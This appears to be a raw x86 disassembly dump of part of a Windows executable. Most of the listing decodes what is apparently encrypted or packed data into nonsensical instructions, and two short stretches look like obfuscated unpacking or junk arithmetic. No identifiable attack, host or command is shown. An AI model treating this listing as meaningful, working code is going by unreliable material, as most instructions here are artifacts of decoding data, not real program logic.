  405620:	sbb    edi,edx
  405622:	cs aaa 
  405624:	lods   eax,DWORD PTR ds:[esi]
  405625:	test   BYTE PTR [edi-0x5bd4eedd],bl
  40562b:	stc    
  40562c:	fs push es
  40562e:	mov    ebx,edi
  405630:	pushf  
  405631:	mov    bh,0xfc
  405633:	leave  
  405634:	add    BYTE PTR [esi-0x50],0x21
  405638:	test   WORD PTR [esi],ax
  40563b:	int3   
  40563c:	and    eax,DWORD PTR [ebx]
  40563e:	(bad)  
  40563f:	xlat   BYTE PTR ds:[ebx]
  405640:	in     al,0x79
  405642:	pusha  
  405643:	inc    edi
  405644:	jns    0x4055dc
  405646:	push   eax
  405647:	rol    DWORD PTR [esi+0x5c],0xa0
  40564b:	shr    BYTE PTR [edx+0x30],cl
  40564e:	xor    ah,BYTE PTR [ebp+0x46]
  405651:	(bad)  
  405652:	lock dec edx
  405654:	mov    al,bh
  405656:	shl    BYTE PTR [edi+0x639f7e61],1
  40565c:	mov    ds,WORD PTR [ecx-0x46]
  40565f:	aaa    
  405660:	aad    0x4f
  405662:	jbe    0x405636
  405664:	mov    al,0x1f
  405666:	mov    edi,0xbc71b937
  40566b:	add    al,BYTE PTR [edx-0x45978a97]
  405671:	lea    ebp,[ebx+0x4d2af8fb]
  405677:	aaa    
  405678:	cmp    al,0x64
  40567a:	ins    BYTE PTR es:[edi],dx
  40567b:	outs   dx,DWORD PTR ds:[esi]
  40567c:	xchg   esi,eax
  40567d:	ja     0x40569c
  40567f:	nop
  405680:	xchg   ebp,eax
  405681:	call   0x67bf2de1
  405686:	popa   
  405687:	gs test al,0xd4
  40568b:	cmc    
  40568c:	fbld   TBYTE PTR [esi-0x546316b0]
  405692:	(bad)  
  405693:	mov    ebp,0xbeb4fb7d
  405698:	pop    esp
  405699:	adc    ebp,DWORD PTR [edi]
  40569b:	aas    
  40569c:	push   0x14
  40569e:	pop    esi
  40569f:	popf   
  4056a0:	fldenv [ecx-0x43]
  4056a3:	test   al,0xa4
  4056a5:	adc    BYTE PTR [edx+ebp*4-0x28c8f16c],dl
  4056ac:	repz jnp 0x4056e7
  4056af:	mov    esi,0x9feeb41a
  4056b4:	push   es
  4056b5:	dec    edi
  4056b6:	imul   ebp,ecx,0x5ad41055
  4056bc:	and    eax,0x5f231d9f
  4056c1:	jg     0x405682
  4056c3:	adc    dh,dh
  4056c5:	loop   0x4056f6
  4056c7:	adc    BYTE PTR [ebp+0x37a7a61c],cl
  4056cd:	lods   eax,DWORD PTR ds:[esi]
  4056ce:	dec    edi
  4056cf:	inc    esp
  4056d0:	stos   BYTE PTR es:[edi],al
  4056d1:	inc    esi
  4056d2:	add    eax,0x2e4b3c78
  4056d7:	out    0xfb,al
  4056d9:	inc    edx
  4056da:	in     eax,0xb2
  4056dc:	lahf   
  4056dd:	fwait
  4056de:	adc    al,0x2c
  4056e0:	scas   al,BYTE PTR es:[edi]
  4056e1:	push   esi
  4056e2:	cld    
  4056e3:	and    bh,BYTE PTR [ecx-0x5d4c24d3]
  4056e9:	retf   0x1e39
  4056ec:	add    ecx,DWORD PTR [eax]
  4056ee:	das    
  4056ef:	pop    es
  4056f0:	cmp    DWORD PTR [ebx-0x1f700910],ebp
  4056f6:	fcmovu st,st(0)
  4056f8:	popf   
  4056f9:	pusha  
  4056fa:	jns    0x405702
  4056fc:	pop    ecx
  4056fd:	rcl    DWORD PTR [di],0xa8
  405701:	rol    DWORD PTR [ebx],cl
  405703:	sub    ebp,DWORD PTR [esi]
  405705:	adc    bh,BYTE PTR [eax+0x69f01038]
  40570b:	xchg   edx,eax
  40570c:	ret    
  40570d:	sub    al,0x2f
  40570f:	mov    BYTE PTR [ecx+0x4d1dee5b],cl
  405715:	sbb    DWORD PTR [ebx+0x1d],edx
  405718:	pusha  
  405719:	jmp    0xb862be15
  40571e:	mov    esi,0x98c8df31
  405723:	jnp    0x405722
  405725:	and    esp,DWORD PTR [ebx]
  405727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405728:	mov    al,0x77
  40572a:	push   es
  40572b:	and    eax,0xe02c8c6c
  405730:	mov    al,0x11
  405732:	xchg   esp,eax
  405733:	(bad)
  405737:	adc    edi,ebp
  405739:	xchg   DWORD PTR [ebx-0x32],edi
  40573c:	xor    eax,0xd6d00ec4
  405741:	stc    
  405742:	scas   al,BYTE PTR es:[edi]
  405743:	jbe    0x4057ac
  405745:	mov    eax,DWORD PTR [edx+eax*2+0xd94cc7c]
  40574c:	pop    ebp
  40574d:	inc    ecx
  40574e:	xchg   BYTE PTR [edx],bh
  405750:	lea    esp,[ebp+0x42]
  405753:	pop    es
  405754:	push   ebp
  405755:	xor    al,0x13
  405757:	dec    eax
  405758:	pushf  
  405759:	in     eax,0x0
  40575b:	in     al,dx
  40575c:	and    BYTE PTR [ebx+0x12446ceb],ah
  405762:	lds    esp,FWORD PTR [eax-0x3a]
  405765:	adc    DWORD PTR [ecx],ebx
  405767:	jmp    0xa3f3:0x8cafe274
  40576e:	in     al,0xea
  405770:	sub    bl,bl
  405772:	xor    BYTE PTR [ebx],0x4c
  405775:	sbb    al,0xa7
  405777:	mov    eax,ds:0xabe38425
  40577c:	imul   esi,DWORD PTR [edi],0xffffffcf
  40577f:	sbb    eax,0x6f648d58
  405784:	sbb    bh,BYTE PTR ds:0x15a00f05
  40578a:	and    al,0xda
  40578c:	cli    
  40578d:	mov    dl,0xc7
  40578f:	ja     0x40576e
  405791:	xchg   esi,eax
  405792:	fist   WORD PTR [ecx+eax*4+0x16]
  405796:	and    BYTE PTR [edx],dh
  405798:	xchg   esi,eax
  405799:	pop    ds
  40579a:	cmc    
  40579b:	pop    ebp
  40579c:	out    dx,eax
  40579d:	mul    DWORD PTR [ebp-0x73]
  4057a0:	jns    0x4057e2
  4057a2:	and    al,0x71
  4057a4:	imul   ebx,DWORD PTR [edx+ecx*4+0x2c4c9847],0x13
  4057ac:	sub    eax,0x6e614784
  4057b1:	iret   
  4057b2:	push   cx
  4057b4:	xchg   ebp,eax
  4057b5:	and    DWORD PTR [eax-0x2d32539f],ecx
  4057bb:	pop    ds
  4057bc:	pop    es
  4057bd:	and    cl,ch
  4057bf:	cmp    eax,0x71052ddb
  4057c4:	pop    edi
  4057c5:	(bad)  
  4057c6:	mov    edx,0x871237e
  4057cb:	cmp    al,0x25
  4057cd:	aas    
  4057ce:	adc    esp,ebx
  4057d0:	xchg   edx,eax
  4057d1:	cli    
  4057d2:	call   0xe9cd:0x3b60239c
  4057d9:	xchg   esi,eax
  4057da:	sbb    dh,BYTE PTR [esp+ebp*8+0x2a8f0455]
  4057e1:	rcr    BYTE PTR [edi-0x2fe8f466],0x1a
  4057e8:	inc    ebp
  4057e9:	fwait
  4057ea:	rcr    BYTE PTR [ecx-0x2614bfb4],0x72
  4057f1:	pushf  
  4057f2:	call   0xf8de:0xf67a11fb
  4057f9:	xchg   esi,eax
  4057fa:	xor    eax,0xf30a757d
  4057ff:	lahf   
  405800:	iret   
  405801:	cs inc edx
  405803:	mov    esi,0xd8851de7
  405808:	pop    ds
  405809:	jb     0x405804
  40580b:	ret    
  40580c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40580d:	sbb    DWORD PTR [esi-0x1d],0x960f8539
  405814:	fnsave [ebx-0x5308e6aa]
  40581a:	adc    al,0x8b
  40581c:	mov    ebx,0xd16d020f
  405821:	adc    al,BYTE PTR [esi-0x59]
  405824:	outs   dx,BYTE PTR ds:[esi]
  405825:	jl     0x405803
  405827:	mov    ah,0x5d
  405829:	cmp    ah,BYTE PTR [eax-0x3ae81fca]
  40582f:	xchg   edx,eax
  405830:	sbb    BYTE PTR [ebp+0x39869ff6],0x2c
  405837:	xchg   ebp,eax
  405838:	arpl   sp,ax
  40583a:	mov    edx,DWORD PTR [esi+0x4]
  40583d:	neg    DWORD PTR ds:0x4283eb
  405843:	mov    DWORD PTR [ebp-0x2c],ecx
  405846:	cmp    DWORD PTR ds:0x4281d7,0x0
  40584d:	mov    DWORD PTR ds:0x4282c7,0x540
  405857:	mov    ecx,0x427
  40585c:	mov    edx,0x7aa7
  405861:	jmp    0x4058af
  405866:	mov    ecx,0x6abc
  40586b:	mov    DWORD PTR ds:0x4282c7,0x2ac5
  405875:	cmp    DWORD PTR ds:0x4281d7,0x0
  40587c:	jb     0x40589d
  405882:	push   0x1050
  405887:	call   DWORD PTR ds:0x428ed4
  40588d:	adc    DWORD PTR ds:0x42836b,edx
  405893:	or     DWORD PTR ds:0x42829b,0x369f
  40589d:	neg    DWORD PTR ds:0x4281db
  4058a3:	sub    DWORD PTR ds:0x4281bb,edi
  4058a9:	sub    edx,0xfd0
  4058af:	mov    ecx,DWORD PTR [ebp+0x18]
  4058b2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058b5:	shrd   ecx,edx,0x2
  4058b9:	shr    edx,0x2
  4058bc:	mov    DWORD PTR [ebp-0x1c],ecx
  4058bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4058c2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058c5:	xor    DWORD PTR [ebp-0x1c],edi
  4058c8:	xor    edx,edx
  4058ca:	or     edx,DWORD PTR [ebp-0x1c]
  4058cd:	shl    ecx,0x1e
  4058d0:	add    edx,DWORD PTR [ebp-0x2c]
  4058d3:	add    DWORD PTR [eax],edx
  4058d5:	mov    eax,DWORD PTR [esi]
  4058d7:	mov    ecx,DWORD PTR [esi+0x4]
  4058da:	shrd   eax,ecx,0x2
  4058de:	shr    ecx,0x2
  4058e1:	mov    ecx,DWORD PTR [esi]
  4058e3:	mov    edx,DWORD PTR [esi+0x4]
  4058e6:	xor    eax,edi
  4058e8:	shl    ecx,0x1e
  4058eb:	xor    edx,edx
  4058ed:	or     edx,eax
  4058ef:	mov    DWORD PTR [ebp-0x4],edx
  4058f2:	mov    DWORD PTR [ebp-0x30],0xca79a575
  4058f9:	mov    eax,0x9c1b89e8
  4058fe:	jmp    0x405cdc
  405903:	ret    
  405904:	scas   eax,DWORD PTR es:[edi]
  405905:	sar    ebx,0x9d
  405908:	fcmovb st,st(2)
  40590a:	scas   al,BYTE PTR es:[edi]
  40590b:	mov    dl,0xbd
  40590d:	(bad)  
  40590e:	jl     0x405894
  405910:	(bad)  
  405911:	out    0xaa,eax
  405913:	ins    DWORD PTR es:[edi],dx
  405914:	mov    cl,0x18
  405916:	sbb    BYTE PTR [esi+0x11181812],bl
  40591c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40591d:	pop    ecx
  40591e:	sub    DWORD PTR [esi],esi
  405920:	cs push eax
  405922:	mov    bh,0x2f
  405924:	lds    edi,FWORD PTR [ebx]
  405926:	mov    ?,WORD PTR [ebx]
  405928:	jmp    0xd7a2:0x7007a094
  40592f:	xor    eax,0xcaff475
  405934:	cmc    
  405935:	adc    eax,0x77a823fb
  40593a:	xor    eax,0x2560e89c
  40593f:	xchg   ecx,eax
  405940:	(bad)  
  405942:	fidiv  WORD PTR [ebx]
  405944:	adc    dl,BYTE PTR [ebp+0x50]
  405947:	lahf   
  405948:	cwde   
  405949:	pop    edi
  40594a:	sahf   
  40594b:	std    
  40594c:	pop    ecx
  40594d:	xchg   ebx,eax
  40594e:	sub    ecx,edx
  405950:	push   esi
  405951:	ret    
  405952:	mov    ds:0x6416137a,al
  405957:	out    dx,eax
  405958:	mov    eax,0xd0800606
  40595d:	lea    edi,[ecx-0xcb8b853]
  405963:	in     al,dx
  405964:	add    BYTE PTR [edi],bh
  405966:	adc    BYTE PTR [ebp-0x43c2b7e3],cl
  40596c:	pusha  
  40596d:	popa   
  40596e:	or     al,0xe
  405970:	pop    ss
  405971:	ret    0xfd50
  405974:	pop    ecx
  405975:	jb     0x4059a0
  405977:	jmp    0xaca9:0xb0c583ef
  40597e:	cli    
  40597f:	xor    BYTE PTR [eax+eiz*2+0x8],cl
  405983:	sbb    al,0x3c
  405985:	in     eax,dx
  405986:	push   0xffffffd2
  405988:	mov    ch,0x8b
  40598a:	sub    al,0x15
  40598c:	mov    ah,0x90
  40598e:	inc    ecx
  40598f:	adc    ah,BYTE PTR ds:0x15bf3e2c
  405995:	(bad)  
  405996:	mov    esi,0xe6648107
  40599b:	sub    dh,BYTE PTR [eax+eax*2-0x1d]
  40599f:	cmp    eax,0x449ad8ae
  4059a4:	inc    esi
  4059a5:	pop    ebp
  4059a6:	push   ds
  4059a7:	inc    ecx
  4059a8:	jae    0x4059a8
  4059aa:	and    al,0x63
  4059ac:	mov    WORD PTR [eax-0x1d],?
  4059af:	lds    ebx,FWORD PTR ds:0x17ea222e
  4059b5:	dec    ebx
  4059b6:	xor    dh,BYTE PTR [ebp-0x76599ccd]
  4059bc:	es cmp eax,0x92311ad6
  4059c2:	lahf   
  4059c3:	xchg   ebp,eax
  4059c4:	ficom  DWORD PTR [eax+eax*2]
  4059c7:	fstp   DWORD PTR [ebp+edi*8+0x2ad72948]
  4059ce:	scas   eax,DWORD PTR es:[edi]
  4059cf:	clc    
  4059d0:	aas    
  4059d1:	fcom   QWORD PTR [edx-0x32]
  4059d4:	aas    
  4059d5:	sti    
  4059d6:	js     0x40595a
  4059d8:	leave  
  4059d9:	mov    ds:0x832a8a47,al
  4059de:	pusha  
  4059df:	mov    bl,0x8d
  4059e1:	test   eax,0xce1e81ae
  4059e6:	add    eax,0x60686b34
  4059eb:	jns    0x405982
  4059ed:	xor    dh,BYTE PTR [edx]
  4059ef:	ins    DWORD PTR es:[edi],dx
  4059f0:	mov    ah,dl
  4059f2:	aaa    
  4059f3:	xlat   BYTE PTR ds:[ebx]
  4059f4:	pop    esp
  4059f5:	xchg   edi,eax
  4059f6:	daa    
  4059f7:	test   DWORD PTR [ecx+0x30f97c68],esp
  4059fd:	xor    dh,BYTE PTR [ebp+0x6d]
  405a00:	push   0xc4b2357f
  405a05:	jmp    0x4059d5
  405a07:	jbe    0x405a23
  405a09:	add    DWORD PTR [edi-0x5],0x46
  405a0d:	dec    ecx
  405a0e:	mov    ebp,0x68ab162
  405a13:	arpl   bx,cx
  405a15:	dec    edi
  405a16:	dec    edi
  405a17:	jae    0x4059b7
  405a19:	jecxz  0x4059ea
  405a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a1c:	pop    ss
  405a1d:	pop    esi
  405a1e:	int    0xcc
  405a20:	jae    0x4059e4
  405a22:	fbstp  TBYTE PTR [ecx+eax*2-0xdbde8b8]
  405a29:	mov    WORD PTR [ecx-0x6e236cea],es
  405a2f:	(bad)  
  405a30:	xor    edi,edi
  405a32:	sub    DWORD PTR ds:0x238512d2,edi
  405a38:	cli    
  405a39:	sub    al,0xd0
  405a3b:	sbb    ebx,ebx
  405a3d:	sbb    BYTE PTR [edi-0x1d],ah
  405a40:	or     DWORD PTR [esi+0x679e7918],eax
  405a46:	cmp    eax,0xdaac3205
  405a4b:	fs out dx,eax
  405a4d:	or     dh,bh
  405a4f:	mov    ch,0x1d
  405a51:	test   bl,ah
  405a53:	push   0x63
  405a55:	loop   0x405a82
  405a57:	daa    
  405a58:	jne    0x405a58
  405a5a:	mul    BYTE PTR [eax-0x4e81eeb0]
  405a60:	popf   
  405a61:	push   0x38bf84d2
  405a66:	repz pop es
  405a68:	test   BYTE PTR [esi+0xa6775de],cl
  405a6e:	push   cs
  405a6f:	dec    edx
  405a70:	pop    edi
  405a71:	xchg   edx,eax
  405a72:	aad    0x76
  405a74:	not    DWORD PTR [ecx-0x75bcd8cf]
  405a7a:	js     0x405aba
  405a7c:	and    eax,0xbd8be1a0
  405a81:	popf   
  405a82:	and    eax,0x4a42ebb8
  405a87:	bound  ecx,QWORD PTR [esi-0x24ba3715]
  405a8d:	aaa    
  405a8e:	je     0x405ac5
  405a90:	or     BYTE PTR [ecx+0x23],ch
  405a93:	std    
  405a94:	in     al,0xbd
  405a96:	cmp    ebx,DWORD PTR [esi-0x37954fd6]
  405a9c:	in     eax,dx
  405a9d:	(bad)  
  405a9e:	push   edi
  405a9f:	mov    BYTE PTR [ecx+edi*2-0x180bdf36],bl
  405aa6:	sbb    BYTE PTR [eax+0x4d],cl
  405aa9:	call   0x68f1:0x8f353979
  405ab0:	pop    ds
  405ab1:	or     eax,0xa10fca67
  405ab6:	les    edi,FWORD PTR [edi]
  405ab8:	(bad)  
  405ab9:	out    0x15,al
  405abb:	push   cs
  405abc:	inc    edi
  405abd:	jno    0x405a94
  405abf:	pop    eax
  405ac0:	aaa    
  405ac1:	push   ecx
  405ac2:	and    BYTE PTR [eax-0x39a39336],bl
  405ac8:	(bad)  
  405ac9:	fisttp QWORD PTR [ecx+0x3f]
  405acc:	int3   
  405acd:	aaa    
  405ace:	and    BYTE PTR [ebp-0x50],0xc4
  405ad2:	push   es
  405ad3:	fistp  QWORD PTR [ebx]
  405ad5:	test   BYTE PTR [ebx],0x72
  405ad8:	retf   0x571f
  405adb:	ficomp WORD PTR [ecx-0xe31ccd6]
  405ae1:	test   ebx,esi
  405ae3:	not    DWORD PTR [ecx]
  405ae5:	pushf  
  405ae6:	pop    ecx
  405ae7:	inc    ecx
  405ae8:	xchg   edi,eax
  405ae9:	leave  
  405aea:	xor    al,0x88
  405aec:	retf   
  405aed:	jmp    0x7049:0xec057879
  405af4:	sbb    ebp,edx
  405af6:	dec    esp
  405af7:	test   al,0x67
  405af9:	test   BYTE PTR [eax],bl
  405afb:	cdq    
  405afc:	mov    cr3,esp
  405aff:	cld    
  405b00:	adc    DWORD PTR ds:0xe4da11ba,ecx
  405b06:	push   es
  405b07:	cli    
  405b08:	imul   esp,DWORD PTR [edi],0x7918bdf8
  405b0e:	neg    dl
  405b10:	ds pop edx
  405b12:	mov    esp,0xcae02c59
  405b17:	std    
  405b18:	int    0x82
  405b1a:	cmp    esi,DWORD PTR [ebp+0x7240a53]
  405b20:	aad    0x97
  405b22:	arpl   WORD PTR [esi-0x46eae04c],bp
  405b28:	inc    esp
  405b29:	jl     0x405b92
  405b2b:	test   eax,0x19b73280
  405b30:	jl     0x405b87
  405b32:	(bad)  
  405b33:	in     eax,dx
  405b34:	sbb    ch,BYTE PTR [edx-0x1c]
  405b37:	adc    al,0x89
  405b39:	(bad)  
  405b3a:	push   ss
  405b3b:	test   DWORD PTR [edx-0x63],eax
  405b3e:	add    ebx,DWORD PTR [esi-0xa]
  405b41:	mov    ah,0x73
  405b43:	loopne 0x405b1e
  405b45:	sub    al,ch
  405b47:	sbb    eax,0xc94a93e9
  405b4c:	out    dx,al
  405b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b4e:	call   0x4a2dc9d7
  405b53:	sti    
  405b54:	mov    eax,ds:0xa014883f
  405b59:	addr16 mov esi,0xae9a701e
  405b5f:	mov    ecx,0xa7dfff0b
  405b64:	mov    ecx,0x6528adea
  405b69:	and    BYTE PTR [ebp+ebp*1-0x2eeca2aa],ch
  405b70:	xor    esi,esi
  405b72:	in     eax,dx
  405b73:	das    
  405b74:	retf   0x82dc
  405b77:	inc    edi
  405b78:	jnp    0x405bba
  405b7a:	inc    ecx
  405b7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b7c:	pop    edi
  405b7d:	push   0x930858f4
  405b82:	mov    ds:0xfde0d5fa,eax
  405b87:	ja     0x405c07
  405b89:	pop    es
  405b8a:	retf   0xc0cd
  405b8d:	push   ss
  405b8e:	mov    edx,0x6de6a14e
  405b93:	mov    cl,0xb5
  405b95:	cmp    eax,0x68534d76
  405b9a:	(bad)  
  405b9b:	fimul  WORD PTR [esi]
  405b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b9e:	iret   
  405b9f:	outs   dx,DWORD PTR ds:[esi]
  405ba0:	xchg   DWORD PTR [esi],ebx
  405ba2:	add    BYTE PTR [edx+0x22749f80],al
  405ba8:	(bad)  
  405baa:	dec    eax
  405bab:	fwait
  405bac:	xchg   edi,eax
  405bad:	nop
  405bae:	into   
  405baf:	push   ebx
  405bb0:	jno    0x405c09
  405bb2:	push   eax
  405bb3:	dec    ecx
  405bb4:	pop    esp
  405bb5:	or     bl,BYTE PTR [esi]
  405bb7:	and    cl,BYTE PTR [esi]
  405bb9:	div    BYTE PTR [eax]
  405bbb:	call   0xb8dd3976
  405bc0:	sub    DWORD PTR [edx-0x35],eax
  405bc3:	retf   
  405bc4:	xchg   esp,eax
  405bc5:	es jbe 0x405bca
  405bc8:	mov    esi,0x786ffbd6
  405bcd:	jge    0x405bf1
  405bcf:	out    0xb1,eax
  405bd1:	mov    WORD PTR [ecx+0x3a],gs
  405bd4:	fdivr  st(3),st
  405bd6:	inc    ebx
  405bd7:	icebp  
  405bd8:	push   esi
  405bd9:	jns    0x405b92
  405bdb:	out    dx,al
  405bdc:	test   BYTE PTR [ecx],cl
  405bde:	in     al,0xe8
  405be0:	dec    eax
  405be1:	pop    es
  405be2:	test   eax,0x4d695769
  405be7:	mov    eax,0xc1ce9720
  405bec:	jno    0x405bec
  405bee:	outs   dx,BYTE PTR ds:[esi]
  405bef:	inc    ecx
  405bf0:	adc    ebx,DWORD PTR [ebx-0x46773315]
  405bf6:	xor    ebx,DWORD PTR [ebp-0x5893489f]
  405bfc:	rcr    BYTE PTR [ebx+0x32],cl
  405bff:	mov    ecx,0xbe273c93
  405c04:	sub    cl,BYTE PTR [ebp+0x5ce03eaa]
  405c0a:	call   0xb8cf:0xcc4ff291
  405c11:	xor    bl,cl
  405c13:	mov    ebx,0x70312f2a
  405c18:	call   0x1fa2f3ab
  405c1d:	xchg   BYTE PTR [ebx+0x2d89d3d6],cl
  405c23:	sub    BYTE PTR [ecx],bl
  405c25:	fiadd  WORD PTR [esi]
  405c27:	aaa    
  405c28:	gs fmul st(0),st
  405c2b:	sub    al,0x7e
  405c2d:	push   ss
  405c2e:	adc    DWORD PTR [eax+0x4],esp
  405c31:	inc    si
  405c33:	push   edi
  405c34:	dec    ebx
  405c35:	jns    0x405c80
  405c37:	cmp    esp,DWORD PTR [ebp-0x13]
  405c3a:	jge    0x405c12
  405c3c:	lds    ebp,FWORD PTR [esi+edx*1-0x6c129b94]
  405c43:	mov    ch,0xef
  405c45:	aad    0x47
  405c47:	jbe    0x405c5e
  405c49:	push   esp
  405c4a:	inc    eax
  405c4b:	dec    esi
  405c4c:	xchg   edx,eax
  405c4d:	es inc ecx
  405c4f:	dec    ebp
  405c50:	cli    
  405c51:	mov    eax,0x3109116a
  405c56:	pusha  
  405c57:	ja     0x405cb0
  405c59:	dec    edx
  405c5a:	adc    BYTE PTR [esi+ecx*4+0x2e],0x7f
  405c5f:	pop    edi
  405c60:	addr16 mov ds:0xa3d8,eax
  405c64:	popa   
  405c65:	clc    
  405c66:	(bad)  
  405c67:	xchg   edx,eax
  405c68:	or     edi,DWORD PTR [ebp+0x1a4655ae]
  405c6e:	mov    BYTE PTR [edx+0x44],al
  405c71:	push   ss
  405c72:	das    
  405c73:	ins    BYTE PTR es:[edi],dx
  405c74:	pop    edi
  405c75:	int    0xd0
  405c77:	push   0x59581876
  405c7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c7d:	repz adc DWORD PTR [esi+ebx*8],ebx
  405c81:	mov    ah,0xc4
  405c83:	shr    edx,1
  405c85:	(bad)
  405c88:	jl     0x405cbe
  405c8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c8b:	rol    eax,cl
  405c8d:	arpl   WORD PTR [ecx-0x7d],dx
  405c90:	aas    
  405c91:	mov    eax,0xeeebb2fd
  405c96:	fs inc ebp
  405c98:	sub    DWORD PTR [ebx+0x65],ebx
  405c9b:	push   0xbe53e5ba
  405ca0:	dec    edx
  405ca1:	ins    DWORD PTR es:[edi],dx
  405ca2:	imul   edx,DWORD PTR [edi],0x3f
  405ca5:	push   esp
  405ca6:	pop    esp
  405ca7:	jle    0x405c67
  405ca9:	ds ds ins BYTE PTR es:[edi],dx
  405cac:	sub    al,0x42
  405cae:	stos   BYTE PTR es:[edi],al
  405caf:	xor    al,0x52
  405cb1:	jp     0x405c41
  405cb3:	aas    
  405cb4:	ss mov edx,0xd9348d97
  405cba:	adc    bh,BYTE PTR [edi+ecx*1+0x4e]
  405cbe:	sbb    DWORD PTR [edi-0x5f],0x875310ef
  405cc5:	mov    edi,0x82e33fad
  405cca:	mov    ebp,0x5910ac6f
  405ccf:	and    esp,ebx
  405cd1:	xor    al,0x47
  405cd3:	sub    eax,0x867f1e8b
  405cd8:	or     bl,BYTE PTR [ebp+0x4589c149]
  405cde:	aam    0xc7
  405ce0:	inc    ebp
  405ce1:	loopne 0x405d54
  405ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ce4:	jns    0x405cb0
  405ce6:	mov    DWORD PTR [ebp-0x1c],eax
  405ce9:	mov    DWORD PTR [ebp-0x10],0xca79a57d
  405cf0:	mov    DWORD PTR [ebp-0xc],eax
  405cf3:	mov    DWORD PTR [ebp-0x60],0xca79a579
  405cfa:	mov    DWORD PTR [ebp-0x5c],eax
  405cfd:	mov    eax,DWORD PTR [ebp-0x30]
  405d00:	mov    ecx,DWORD PTR [ebp-0x2c]
  405d03:	shrd   eax,ecx,0x2
  405d07:	shr    ecx,0x2
  405d0a:	mov    ecx,DWORD PTR [ebp-0x30]
  405d0d:	mov    edx,DWORD PTR [ebp-0x2c]
  405d10:	xor    eax,edi
  405d12:	shl    ecx,0x1e
  405d15:	xor    edx,edx
  405d17:	or     eax,edx
  405d19:	jmp    0x4060f7
  405d1e:	cmp    ebp,DWORD PTR [ecx+0x3e]
  405d21:	lock sbb ch,BYTE PTR [esi+0x62d8231a]
  405d28:	shl    DWORD PTR [eax-0xb],1
  405d2b:	rol    BYTE PTR [ebp+0x6a],1
  405d2e:	repnz test eax,0x129e1818
  405d34:	sbb    BYTE PTR [eax],bl
  405d36:	dec    esi
  405d37:	add    al,al
  405d39:	es jne 0x405d3f
  405d3c:	push   ds
  405d3d:	scas   eax,DWORD PTR es:[edi]
  405d3e:	or     al,0x9a
  405d40:	rcr    BYTE PTR [esi+0x352782f2],cl
  405d46:	push   0x30
  405d48:	or     ah,BYTE PTR [ecx-0x2af5ec9e]
  405d4e:	jo     0x405d5f
  405d50:	inc    esi
  405d51:	mov    WORD PTR [edx+0x50],gs
  405d54:	lea    edx,[ecx+0x25]
  405d57:	inc    ebx
  405d58:	sbb    eax,0xd2a4e961
  405d5d:	std    
  405d5e:	sub    ah,ch
  405d60:	add    DWORD PTR [ecx+0x60cae52c],0x24
  405d67:	dec    esp
  405d68:	in     eax,0x90
  405d6a:	pop    eax
  405d6b:	(bad)  
  405d6c:	push   ss
  405d6d:	daa    
  405d6e:	push   edi
  405d6f:	fistp  QWORD PTR [ebx+edi*4]
  405d72:	mov    ds:0x66361bd9,eax
  405d77:	aad    0x61
  405d79:	add    dh,bl
  405d7b:	cmovp  ecx,DWORD PTR [esi]
  405d7e:	and    ebx,esi
  405d80:	scas   al,BYTE PTR es:[edi]
  405d81:	mul    BYTE PTR [ebx+0x5a]
  405d84:	sub    al,0x69
  405d86:	in     eax,dx
  405d87:	jno    0x405d50
  405d89:	scas   eax,DWORD PTR es:[edi]
  405d8a:	in     eax,dx
  405d8b:	out    dx,eax
  405d8c:	out    dx,eax
  405d8d:	out    0x89,eax
  405d8f:	into   
  405d90:	and    edi,esp
  405d92:	sub    dh,BYTE PTR [edi]
  405d94:	test   ebx,edi
  405d96:	cs mov ecx,0x84a64bf6
  405d9c:	scas   al,BYTE PTR es:[edi]
  405d9d:	mov    bh,0xf0
  405d9f:	bound  ecx,QWORD PTR [eax]
  405da1:	fld    DWORD PTR [eax+0x74cd45fb]
  405da7:	pop    ebp
  405da8:	xchg   ebp,eax
  405da9:	jmp    0x381a:0x45f6af01
  405db0:	sbb    eax,0x929da4bb
  405db5:	(bad)  
  405db6:	pop    esi
  405db7:	jle    0x405df0
  405db9:	shl    DWORD PTR [ebx+edx*1+0x6076eec7],1
  405dc0:	or     al,0x74
  405dc2:	add    esi,DWORD PTR [ecx+ecx*1+0x5d]
  405dc6:	xor    ebp,ebx
  405dc8:	out    0xbe,al
  405dca:	push   ds
  405dcb:	retf   0xc223
  405dce:	inc    ebp
  405dcf:	mov    ecx,0xde6af620
  405dd4:	add    DWORD PTR [ebx],0x0
  405dd7:	mov    ch,0xb0
  405dd9:	dec    ecx
  405dda:	(bad)  
  405ddb:	mov    ecx,0x87add224
  405de0:	inc    ebp
  405de1:	sar    bl,cl
  405de3:	sbb    DWORD PTR [ebx+0xf178d0],esi
  405de9:	enter  0xde23,0x7c
  405ded:	mov    ch,ch
  405def:	fisttp QWORD PTR [eax-0x2b]
  405df2:	ret    0xc7d7
  405df5:	rol    BYTE PTR [eax+0x78],1
  405df8:	es push esi
  405dfa:	push   ds
  405dfb:	or     DWORD PTR [esi],ebx
  405dfd:	add    bl,BYTE PTR [ecx-0x40]
  405e00:	dec    edx
  405e01:	and    eax,0x500805ce
  405e06:	xchg   DWORD PTR [ebx-0x3e9439eb],ebx
  405e0c:	add    al,0x8e
  405e0e:	jg     0x405dcc
  405e10:	fild   WORD PTR [ebx+ecx*8+0x79]
  405e14:	leave  
  405e15:	jnp    0x405dbd
  405e17:	cs lds edi,FWORD PTR es:[esp+eiz*8-0x47]
  405e1d:	pusha  
  405e1e:	adc    al,bh
  405e20:	push   eax
  405e21:	mov    ds:0x1a2a996d,al
  405e26:	add    dh,BYTE PTR [edx]
  405e28:	mov    bl,0xee
  405e2a:	sbb    al,0x80
  405e2c:	mov    cl,0x6a
  405e2e:	xchg   DWORD PTR [edx-0x27],ebx
  405e31:	fimul  WORD PTR [edi]
  405e33:	(bad)  
  405e34:	and    dh,cl
  405e36:	nop
  405e37:	inc    edx
  405e38:	adc    BYTE PTR [edi+edx*4-0x16],al
